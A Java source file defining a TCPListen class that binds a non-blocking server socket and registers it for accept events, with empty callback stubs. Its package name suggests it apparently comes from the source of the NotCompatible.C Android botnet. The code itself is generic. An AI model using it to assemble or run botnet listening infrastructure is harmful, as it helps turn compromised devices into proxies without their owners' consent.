package diff.notcompatible.c.bot.net.tcp;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.ServerSocketChannel;

import diff.notcompatible.c.bot.net.CustomSocket;

public class TCPListen extends CustomSocket {
    public ServerSocketChannel channel;
    public Selector selector;
    public SelectionKey selfKey;

    public TCPListen(){
    	
    }
    
    public TCPListen(Selector newSelector) {
        selector = newSelector;
    }

    public void listen(int port) throws IOException {
        try {
            channel = ServerSocketChannel.open();
            channel.socket().setReuseAddress(true);
            channel.socket().bind(new InetSocketAddress(port));
            channel.configureBlocking(false);
            selfKey = this.channel.register(this.selector, 16);
            selfKey.attach(this);
        } catch (Exception e) {
            onNoConnect(selfKey);
        }
    }

    public void onAccept(SelectionKey key) throws IOException {

    }

    public void onClose(SelectionKey key) throws IOException {
        if (key != null) {
            key.cancel();
        }
    }

    public void onNoConnect(SelectionKey key) throws IOException {

    }
}
